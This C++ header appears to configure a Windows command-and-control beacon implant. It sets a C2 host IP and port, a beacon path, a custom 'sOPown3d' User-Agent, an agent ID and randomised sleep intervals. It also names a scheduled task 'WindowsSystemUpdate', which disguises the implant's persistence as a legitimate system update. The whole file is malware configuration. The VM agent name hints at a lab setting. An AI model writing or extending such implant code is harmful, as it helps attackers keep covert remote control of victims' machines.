#pragma once

#ifndef C2_HOST
#define C2_HOST L"192.168.1.76"
#endif

#ifndef C2_PORT
#define C2_PORT 8000
#endif

// Path used for every beacon request.
constexpr wchar_t kBeaconPath[] = L"/";

// User-Agent sent with every request.
constexpr wchar_t kUserAgent[] = L"sOPown3d/1.0";

constexpr char kAgentId[] = "VM-Windows-01";

constexpr int kSleepMinSec = 10;
constexpr int kSleepMaxSec = 30;

constexpr char kTaskName[] = "WindowsSystemUpdate";
